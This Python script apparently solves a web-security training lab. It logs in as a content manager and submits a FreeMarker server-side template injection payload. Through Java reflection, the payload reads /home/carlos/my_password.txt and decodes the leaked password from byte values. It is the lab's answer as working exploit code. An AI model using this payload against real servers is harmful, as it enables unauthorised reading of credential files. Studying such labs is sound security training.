from web_security_academy.core.logger import logger
from bs4 import BeautifulSoup


def solve_lab(session):
    session.login("content-manager", "C0nt3ntM4n4g3r")

    payload = (
        "${product.getClass()"
        ".getProtectionDomain()"
        ".getCodeSource()"
        ".getLocation()"
        ".toURI()"
        ".resolve('/home/carlos/my_password.txt')"
        ".toURL()"
        ".openStream()"
        ".readAllBytes()"
        '?join(" ")}'
    )

    logger.info("Previewing a product description with the following template:")
    logger.info(payload)

    data = {
        "csrf": session.get_csrf_token("/product/template?productId=1"),
        "template-action": "preview",
        "template": payload,
    }
    resp = session.post_path("/product/template?productId=1", data=data)

    soup = BeautifulSoup(resp.text, "lxml")
    encoded_password = soup.select_one("#preview-result").text.strip()
    logger.info(f"Extracted encoded password: {encoded_password}")

    # Get ASCII value of each number
    password = "".join([chr(int(num)) for num in encoded_password.split()])
    logger.info(f"Decoded password: {password}")
    session.submit_solution(password)
